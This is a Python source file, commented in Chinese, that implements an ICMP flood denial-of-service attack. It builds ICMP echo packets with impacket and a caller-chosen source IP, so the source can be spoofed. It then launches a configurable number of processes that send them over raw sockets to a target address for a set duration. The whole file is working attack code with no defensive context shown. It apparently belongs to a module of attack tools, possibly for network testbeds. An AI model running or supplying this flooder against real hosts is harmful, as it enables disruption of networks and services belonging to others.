import socket
import time
from multiprocessing import Queue
from impacket import ImpactPacket  # 只有在 linux 之中才能够使用
from datetime import datetime
from modules.attacks import tools as tm
import multiprocessing


def icmp_flood_attack(attack_thread_count: int, attack_node_ip: str, attacked_node_ip: str, attack_duration: int):
    """
    icmp 泛洪攻击
    :param attack_thread_count: 攻击线程数量
    :param attack_node_ip: 攻击节点的 ip 也就是本机节点的 ip
    :param attacked_node_ip: 被攻击节点的 ip
    :param attack_duration: 攻击时长
    :return:
    """
    # 暂停队列
    stop_queue = Queue(maxsize=1)
    # 攻击线程数量
    attack_processes = []
    # 创建 icmp packet
    icmp_packet = generate_icmp_packet(attack_node_ip, attacked_node_ip)
    # 开启指定数量的攻击进程
    for index in range(attack_thread_count):
        attack_process = multiprocessing.Process(target=icmp_flood_attack_single_thread,
                                                 args=(icmp_packet, attacked_node_ip, stop_queue))
        attack_processes.append(attack_process)
        attack_process.start()
    # 攻击开始时间
    start_time = datetime.now()
    while True:
        time.sleep(1)
        # 当前时间
        current_time = datetime.now()
        # 已经过去的时间
        time_delta_in_seconds = (current_time - start_time).seconds
        # 超过时间退出
        if time_delta_in_seconds > attack_duration:
            break
    # 向队列发送停止攻击信号
    stop_queue.put("stop attack")
    for attack_process in attack_processes:
        attack_process.join()


def generate_icmp_packet(attack_node_ip: str, attacked_node_ip: str):
    payload_size = 1024
    app_data = b"A" * payload_size
    # create ip layer
    ip_packet = ImpactPacket.IP()
    ip_packet.set_ip_src(attack_node_ip)
    ip_packet.set_ip_dst(attacked_node_ip)
    # create icmp layer
    icmp_layer = ImpactPacket.ICMP()
    icmp_layer.set_icmp_type(icmp_layer.ICMP_ECHO)
    # create payload
    icmp_layer.contains(ImpactPacket.Data(app_data))
    ip_packet.contains(icmp_layer)
    return ip_packet


def icmp_flood_attack_single_thread(icmp_packet, attacked_node_ip: str, stop_queue: Queue):
    raw_socket = tm.Tools.raw_socket_creator(socket.IPPROTO_ICMP)
    while True:
        raw_socket.sendto(icmp_packet.get_packet(), (attacked_node_ip, 0))
        if not stop_queue.empty():
            break
